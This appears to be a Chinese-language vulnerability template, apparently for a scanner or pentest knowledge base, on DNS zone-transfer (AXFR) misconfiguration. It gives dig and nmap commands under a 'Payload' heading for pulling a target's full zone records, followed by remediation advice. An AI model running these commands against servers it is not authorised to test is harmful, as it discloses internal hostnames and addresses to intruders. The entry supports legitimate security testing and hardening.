---
id: DNS-DNS-ZONE-TRANSFER
title: DNS 域传送漏洞
product: dns
vendor: BIND
version_affected: "all versions"
severity: MEDIUM
tags: [info_disclosure, 无需认证]
fingerprint: ["DNS", "BIND", "named"]
---

## 漏洞描述

DNS服务器配置不当允许任何人执行区域传输（AXFR），获取整个域的所有DNS记录，包括内部主机名、IP地址等敏感信息。

## 影响版本

- 所有未正确配置DNS域传送权限的DNS服务器

## 前置条件

- DNS服务器允许从任意地址进行区域传输

## 利用步骤

1. 使用dig命令发送AXFR请求
2. 获取完整域记录

## Payload

```bash
# 查询A记录
dig @target your-domain.com -t A

# 域传送
dig @target your-domain.com -t AXFR

# 使用nmap脚本扫描
nmap --script dns-zone-transfer.nse --script-args dns-zone-transfer.domain=vulhub.org -Pn -p 53 target-ip
```

## 验证方法

```bash
# 检查是否返回完整域记录
dig @target your-domain.com -t AXFR
# 成功时返回所有DNS记录
```

## 修复建议

1. 在DNS配置中限制AXFR只允许授权服务器
2. 使用IP白名单访问控制
3. 启用TSIG认证进行域传送
4. 定期审计DNS配置
